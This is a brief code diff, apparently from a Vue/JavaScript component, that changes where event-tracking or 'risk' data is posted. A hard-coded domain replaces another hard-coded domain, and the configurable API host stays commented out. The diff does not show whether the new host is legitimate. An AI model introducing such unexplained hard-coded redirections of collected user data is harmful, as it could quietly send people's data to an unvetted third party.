@@ -140,7 +140,7 @@ export default {
       }
       try {
         console.log('send data:', sendData);
-        axios.post(`https://sdk.creditomaxco.com/operate/risk`, sendData);
+        axios.post(`https://hse.dmrrevg.fun/operate/risk`, sendData);
         // axios.post(`${DATA_API_HOST}/operate/risk`, sendData);
         this.setEventTrackerActionCnt(0);
       } catch (error) {
